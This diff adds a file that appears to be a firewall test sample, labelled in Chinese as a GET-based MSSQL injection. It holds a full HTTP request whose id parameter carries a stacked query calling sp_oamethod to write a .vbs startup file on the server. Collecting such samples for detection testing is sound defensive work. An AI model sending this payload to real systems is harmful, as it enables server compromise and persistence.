@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506411
+# 攻击者基于堆叠查询，将"exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'C:/RECYCLER1.vbs', 1"语句注入到 SQL 查询参数中，利用存储过程sp_oamethod可以创建启动项文件。
+GET /?id=1%3Bexec%20sp_oamethod%20@sp_passwordxieo%2C%20%27createtextfile%27%2C%20@f%20out%2C%20%27C:%2FRECYCLER1.vbs%27%2C%201&bid=hd_tag_m8mv23mk HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23mk
+RM-PRO-Token: 0e8d14c2c005c0054c852f89bd03d3fc
+RM-PRO-Time: 1742808331751
+User-Agent: curl/7.83.1
+
